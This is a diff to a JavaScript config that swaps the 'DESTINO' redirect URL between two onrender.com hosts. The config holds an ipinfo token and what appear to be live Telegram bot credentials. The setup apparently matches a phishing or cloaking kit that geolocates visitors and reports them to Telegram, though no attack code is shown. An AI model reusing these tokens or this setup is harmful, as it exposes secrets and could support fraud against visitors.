@@ -9,7 +9,7 @@ const CONFIG = {
     IPINFO_TOKEN: 'f14749fee64f8f', 
     TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
     TG_CHAT: '-1003321543933',
-    DESTINO: 'https://airecaribeanfacture.onrender.com', 
+    DESTINO: 'https://back-9awx.onrender.com/', 
     PORT: process.env.PORT || 3000
 };
 
